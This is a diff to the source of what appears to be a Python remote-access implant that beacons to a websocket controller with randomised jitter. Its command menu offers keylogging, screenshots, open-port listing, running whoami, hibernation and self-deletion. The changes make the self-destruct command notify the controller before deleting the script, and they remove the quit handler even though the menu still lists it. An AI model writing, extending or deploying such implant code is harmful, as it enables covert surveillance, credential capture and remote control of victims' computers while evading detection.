@@ -13,7 +13,7 @@ import socket
 
 hibernate_time = False
 device_us = socket.gethostname()
-destroyed = False
+destroyed= False
 
 def on_message(ws, message): 
     global hibernate_time 
@@ -34,7 +34,7 @@ def on_message(ws, message):
         Keylog [x]          Start Keylogging [OPTIONS], Set a x Timer to stop keylog (Root Permissions Required)     
         Listen              List Of Open Ports
         Screenshot          Receive Screenshot
-        Selfdestroy         Destroy This Script
+        Selfdestroy         Destroy This Agent
         Hibernate [x]       Cut Connection And Block Sending Lookup Requests For x Seconds      
         Quit                Cut Connection, Lookup Requests Will Start Then
         Help                Open List Of Available Commands 
@@ -49,9 +49,10 @@ def on_message(ws, message):
         elif command == "selfdestroy":
             try:
                 global destroyed
-                destroyed = True
+                ws.send(json.dumps({"message":"This Agent will be deleted", "sender": "", "agent":device_us, "selfdestroy":True}))
                 ws.close()
                 os.remove(__file__)
+                destroyed = True
             except:
                 msg="Error"
             
@@ -68,17 +69,12 @@ def on_message(ws, message):
                     msg = "'hibernate' argument cannot be negative"
                 
                 else: 
-                    ws.send(json.dumps({"message": "Bye! See you in a bit more than " + str(hibernate_time) + " seconds"}))
+                    ws.send(json.dumps({"message": "Bye! See you in a bit more than " + str(hibernate_time) + " seconds", "sender": "", "agent":device_us}))
                     ws.close()
 
             except IndexError as e:
                 msg = "'hibernate' needs an argument"
-
-        elif command == "quit":
-            ws.send(json.dumps({"message": "See you soon"}))
-            ws.close()
-            
-        
+                    
         elif command == "infos":
             #Username
             cm = "whoami" 
@@ -219,6 +215,7 @@ def monitor():
 
 if __name__ == "__main__":
     #websocket.enableTrace(True)
+    
     while True:
         if destroyed == True:
             break
@@ -244,7 +241,7 @@ if __name__ == "__main__":
             jitter = random.uniform(400, 600)
             lookup = base * jitter
 
-        #lookup = 5 #REMOVE OUT OF TESTING
+        lookup = 5 #REMOVE OUT OF TESTING
 
         print(lookup)
         time.sleep(lookup)
